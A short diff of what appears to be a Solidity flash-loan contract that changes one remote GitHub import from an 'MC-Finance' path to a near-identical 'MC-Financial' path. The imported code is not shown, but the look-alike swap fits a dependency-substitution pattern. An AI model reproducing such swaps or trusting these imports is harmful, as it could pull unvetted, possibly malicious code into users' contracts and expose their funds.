@@ -15,7 +15,7 @@ import "https://github.com/CreamFi/compound-protocol/blob/master/contracts/CToke
 import "https://github.com/CreamFi/compound-protocol/blob/master/contracts/CTokenCheckRepay.sol";
 
 // ZooTrade Router
-import "https://github.com/MC-Finance/router/blob/main/IFantomRouterCalleMain.sol";
+import "https://github.com/MC-Financial/router/blob/main/IFantomRouterCalleMain.sol";
 
 // Multiplier-Finance Smart Contracts
 import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
